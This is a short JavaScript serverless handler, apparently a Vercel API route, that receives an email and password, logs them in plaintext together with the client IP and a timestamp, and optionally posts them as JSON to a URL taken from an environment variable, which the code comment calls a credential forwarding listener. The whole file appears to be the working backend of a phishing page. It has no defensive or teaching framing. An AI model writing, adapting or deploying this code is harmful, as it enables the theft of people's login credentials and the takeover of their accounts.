export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password } = req.body;
  const timestamp = new Date().toISOString();

  // This will appear in your `vercel logs` terminal
  console.log(`
========================================
TIME : ${timestamp}
EMAIL : ${email}
PASSWORD : ${password}
IP : ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}
========================================
`);

  // Optional: forward credentials to a local listener if you set the env var
  if (process.env.FORWARD_URL) {
    try {
      await fetch(process.env.FORWARD_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, timestamp }),
      });
    } catch (e) {
      console.error('Forward failed:', e.message);
    }
  }

  res.status(200).json({ success: true });
}
